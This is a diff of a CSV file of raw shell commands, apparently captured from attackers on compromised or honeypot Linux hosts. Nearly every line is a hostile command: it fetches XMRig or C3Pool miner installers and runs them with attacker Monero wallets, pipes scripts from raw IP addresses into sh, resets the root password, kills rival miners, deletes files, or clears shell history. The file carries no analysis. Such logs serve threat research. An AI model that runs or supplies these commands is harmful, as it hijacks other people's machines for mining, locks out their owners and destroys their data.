@@ -1,95 +1,95 @@
 ,Comandos: 
-0,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker40 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker40 -p x -k --nicehash --coin monero -a rx/0
-1,scp -t /tmp/G3kGn3O5
-2,cd /tmp && chmod +x 8Nh5Z4Sa && bash -c ./8Nh5Z4Sa
-3,scp -t /tmp/0wJisy0v
-4,whoami
-5,./f1UT7LxW
-6,scp -t /tmp/HmB9mU2U
-7,cd /tmp && chmod +x f1UT7LxW && bash -c ./f1UT7LxW
-8,./uSwkH3jG
-9,yum install wget -y; apt install wget -y; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh google
-10,"curl: option -L not recognized
+0,scp -t /tmp/Vd52Oktn
+1,./LdXpjX0H
+2,wget -qO - http://92.207.203.157/x/1sh | sh > /dev/null 2>&1 &
+3,cd /tmp && chmod +x wOa45v79 && bash -c ./wOa45v79
+4,./wOa45v79
+5,cd /tmp && chmod +x HmB9mU2U && bash -c ./HmB9mU2U
+6,cd /tmp; rm -rf wget.sh; wget http://109.206.241.211/wget.sh; curl -O http://109.206.241.211/wget.sh; chmod 777 wget.sh; ./wget.sh
+7,rm -rf /var/run/1sh; wget -c http://92.207.203.157/x/1sh -P /var/run && sh /var/run/1sh &
+8,ps -ef | grep '[Mm]iner'
+9,cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
+10,echo root:ds234e31s223tij24j4hgg777ji1rg|chpasswd|bash; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1; nvidia-smi
+11,uname -a
+12,scp -t /tmp/xjLGklh3
+13,scp -t /tmp/HmB9mU2U
+14,echo Hi | cat -n
+15,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker19 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker19 -p x -k --nicehash --coin monero -a rx/0
+16,cd /tmp && chmod +x ZvBrhSDC && bash -c ./ZvBrhSDC
+17,/ip cloud print
+18,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+19,cd /tmp && chmod +x G3kGn3O5 && bash -c ./G3kGn3O5
+20,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1 -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1 -k --nicehash --coin monero -a rx/0
+21,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker15 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker15 -p x -k --nicehash --coin monero -a rx/0
+22,scp -t /tmp/cjYL0YNy
+23,scp -t /tmp/xjlh2ZJ1
+24,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker17 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker17 -p x -k --nicehash --coin monero -a rx/0
+25,./Vd52Oktn
+26,uname -s -v -n -r -m
+27,./xjlh2ZJ1
+28,./ZvBrhSDC
+29,curl http://92.207.203.157/x/3sh | sh
+30,cd /tmp && chmod +x Vd52Oktn && bash -c ./Vd52Oktn
+31,./cjYL0YNy
+32,cd /tmp && chmod +x 0wJisy0v && bash -c ./0wJisy0v
+33,scp -t /tmp/tgXXoqAJ
+34,cd /tmp && chmod +x qL882Wir && bash -c ./qL882Wir
+35,ls
+36,cd /tmp && chmod +x xjLGklh3 && bash -c ./xjLGklh3
+37,echo -e '\x67\x61\x79\x66\x67\x74'
+38,scp -t /tmp/uSwkH3jG
+39,"echo -e ""\x6F\x6B"""
+40,scp -t /tmp/JfVEBHNz
+41,cd /tmp && chmod +x JfVEBHNz && bash -c ./JfVEBHNz
+42,scp -t /tmp/0wJisy0v
+43,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.8 -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.8 -k --nicehash --coin monero -a rx/0
+44,cd /tmp && chmod +x 8Nh5Z4Sa && bash -c ./8Nh5Z4Sa
+45,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.c4c$RANDOM -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.c4c$RANDOM -p x -k --nicehash --coin monero -a rx/0
+46,./G3kGn3O5
+47,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.$RANDOM -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.$RANDOM -p x -k --nicehash --coin monero -a rx/0
+48,scp -t /tmp/LdXpjX0H
+49,./xFdiNXs0
+50,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker40 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker40 -p x -k --nicehash --coin monero -a rx/0
+51,./JfVEBHNz
+52,scp -t /tmp/wOa45v79
+53,cd /tmp && chmod +x uSwkH3jG && bash -c ./uSwkH3jG
+54,yum install wget -y; apt install wget -y; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh google
+55,/bin/eyshcjdmzg
+56,cd /tmp && chmod +x f1UT7LxW && bash -c ./f1UT7LxW
+57,./xjLGklh3
+58,ls -la /var/run/gcc.pid
+59,scp -t /tmp/GakD4Lhf
+60,./GakD4Lhf
+61,ps | grep '[Mm]iner'
+62,./8Nh5Z4Sa
+63,"rm -rf *; cd /tmp; rm -rf *; pkill xmrig; echo -e ""xoxox1\nxoxox1"" | passwd; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj"
+64,#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://125.27.179.36/scripts/23s; curl -O http://125.27.179.36/scripts/23s; chmod +x 23s; ./23s; wget http://125.27.179.36/scripts/23; curl -O http://125.27.179.36/scripts/23; chmod +x 23; ./23; rm -rf 23.sh; history -c; 
+65,wget -qO - http://92.207.203.157/x/2sh | sh > /dev/null 2>&1 &
+66,cd /tmp && chmod +x LdXpjX0H && bash -c ./LdXpjX0H
+67,cd /tmp && chmod +x xFdiNXs0 && bash -c ./xFdiNXs0
+68,./f1UT7LxW
+69,cat /proc/cpuinfo
+70,./tgXXoqAJ
+71,ifconfig
+72,scp -t /tmp/qL882Wir
+73,./0wJisy0v
+74,scp -t /tmp/8Nh5Z4Sa
+75,scp -t /tmp/ZvBrhSDC
+76,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && sudo su; ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J -k --nicehash --coin monero -a rx/0
+77,whoami
+78,cd /tmp && chmod +x xjlh2ZJ1 && bash -c ./xjlh2ZJ1
+79,scp -t /tmp/xFdiNXs0
+80,./HmB9mU2U
+81,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker52 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker52 -p x -k --nicehash --coin monero -a rx/0
+82,rm -rf /tmp/2sh; wget -c http://92.207.203.157/x/2sh -P /tmp && sh /tmp/2sh &
+83,"curl: option -L not recognized
 curl: try 'curl --help' or 'curl --manual' for more information
 "
-11,./wOa45v79
-12,cd /tmp && chmod +x xjlh2ZJ1 && bash -c ./xjlh2ZJ1
-13,"echo -e ""\x6F\x6B"""
-14,cd /tmp && chmod +x LdXpjX0H && bash -c ./LdXpjX0H
-15,cd /tmp && chmod +x wOa45v79 && bash -c ./wOa45v79
-16,rm -rf /tmp/2sh; wget -c http://92.207.203.157/x/2sh -P /tmp && sh /tmp/2sh &
-17,wget -qO - http://92.207.203.157/x/2sh | sh > /dev/null 2>&1 &
-18,ls -la /var/run/gcc.pid
-19,cd /tmp && chmod +x JfVEBHNz && bash -c ./JfVEBHNz
-20,uname -a
-21,cd /tmp && chmod +x qL882Wir && bash -c ./qL882Wir
-22,scp -t /tmp/LdXpjX0H
-23,./G3kGn3O5
-24,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.$RANDOM -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.$RANDOM -p x -k --nicehash --coin monero -a rx/0
-25,./cjYL0YNy
-26,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker17 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker17 -p x -k --nicehash --coin monero -a rx/0
-27,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker52 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker52 -p x -k --nicehash --coin monero -a rx/0
-28,scp -t /tmp/xjLGklh3
-29,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
-30,scp -t /tmp/f1UT7LxW
-31,ifconfig
-32,scp -t /tmp/GakD4Lhf
-33,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker15 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker15 -p x -k --nicehash --coin monero -a rx/0
-34,cd /tmp && chmod +x tgXXoqAJ && bash -c ./tgXXoqAJ
-35,cd /tmp && chmod +x G3kGn3O5 && bash -c ./G3kGn3O5
-36,scp -t /tmp/xFdiNXs0
-37,cd /tmp && chmod +x 0wJisy0v && bash -c ./0wJisy0v
-38,curl http://92.207.203.157/x/3sh | sh
-39,uname -s -v -n -r -m
-40,cd /tmp && chmod +x cjYL0YNy && bash -c ./cjYL0YNy
-41,scp -t /tmp/Vd52Oktn
-42,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1 -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1 -k --nicehash --coin monero -a rx/0
-43,./tgXXoqAJ
-44,./qL882Wir
-45,echo Hi | cat -n
-46,scp -t /tmp/JfVEBHNz
-47,./Vd52Oktn
-48,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker19 -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.1worker19 -p x -k --nicehash --coin monero -a rx/0
-49,./0wJisy0v
-50,echo root:ds234e31s223tij24j4hgg777ji1rg|chpasswd|bash; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1; nvidia-smi
-51,./ZvBrhSDC
-52,scp -t /tmp/wOa45v79
-53,cd /tmp && chmod +x xFdiNXs0 && bash -c ./xFdiNXs0
-54,cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
-55,cd /tmp && chmod +x xjLGklh3 && bash -c ./xjLGklh3
-56,cd /tmp && chmod +x ZvBrhSDC && bash -c ./ZvBrhSDC
-57,/bin/eyshcjdmzg
-58,./JfVEBHNz
-59,./xjlh2ZJ1
-60,ps -ef | grep '[Mm]iner'
-61,scp -t /tmp/xjlh2ZJ1
-62,"rm -rf *; cd /tmp; rm -rf *; pkill xmrig; echo -e ""xoxox1\nxoxox1"" | passwd; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj"
-63,wget -qO - http://92.207.203.157/x/1sh | sh > /dev/null 2>&1 &
-64,echo -e '\x67\x61\x79\x66\x67\x74'
-65,./HmB9mU2U
-66,rm -rf /var/run/1sh; wget -c http://92.207.203.157/x/1sh -P /var/run && sh /var/run/1sh &
-67,cd /tmp && chmod +x GakD4Lhf && bash -c ./GakD4Lhf
-68,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && sudo su; ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J -k --nicehash --coin monero -a rx/0
-69,cat /proc/cpuinfo
-70,scp -t /tmp/qL882Wir
-71,ps | grep '[Mm]iner'
-72,./xFdiNXs0
-73,ls
-74,scp -t /tmp/8Nh5Z4Sa
-75,cd /tmp && chmod +x Vd52Oktn && bash -c ./Vd52Oktn
-76,cd /tmp; rm -rf xmr*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.8 -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.8 -k --nicehash --coin monero -a rx/0
-77,cd /tmp && chmod +x HmB9mU2U && bash -c ./HmB9mU2U
-78,/ip cloud print
-79,./8Nh5Z4Sa
-80,scp -t /tmp/cjYL0YNy
-81,scp -t /tmp/ZvBrhSDC
-82,cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.c4c$RANDOM -p x -k --nicehash --coin monero -a rx/0; ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.c4c$RANDOM -p x -k --nicehash --coin monero -a rx/0
-83,./xjLGklh3
-84,scp -t /tmp/uSwkH3jG
-85,#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://125.27.179.36/scripts/23s; curl -O http://125.27.179.36/scripts/23s; chmod +x 23s; ./23s; wget http://125.27.179.36/scripts/23; curl -O http://125.27.179.36/scripts/23; chmod +x 23; ./23; rm -rf 23.sh; history -c; 
-86,./GakD4Lhf
-87,echo root:ds234e31s123tij24jtiu3ji3rg|chpasswd|bash; uname -a; pkill xmrig; pkill cnrig; pkill x86; pkill x86_64; pkill Opera; nvidia-smi; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1
-88,scp -t /tmp/tgXXoqAJ
-89,cd /tmp && chmod +x uSwkH3jG && bash -c ./uSwkH3jG
-90,cd /tmp; rm -rf wget.sh; wget http://109.206.241.211/wget.sh; curl -O http://109.206.241.211/wget.sh; chmod 777 wget.sh; ./wget.sh
-91,./LdXpjX0H
+84,echo root:ds234e31s123tij24jtiu3ji3rg|chpasswd|bash; uname -a; pkill xmrig; pkill cnrig; pkill x86; pkill x86_64; pkill Opera; nvidia-smi; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1
+85,cd /tmp && chmod +x tgXXoqAJ && bash -c ./tgXXoqAJ
+86,scp -t /tmp/G3kGn3O5
+87,cd /tmp && chmod +x GakD4Lhf && bash -c ./GakD4Lhf
+88,cd /tmp && chmod +x cjYL0YNy && bash -c ./cjYL0YNy
+89,./uSwkH3jG
+90,scp -t /tmp/f1UT7LxW
+91,./qL882Wir
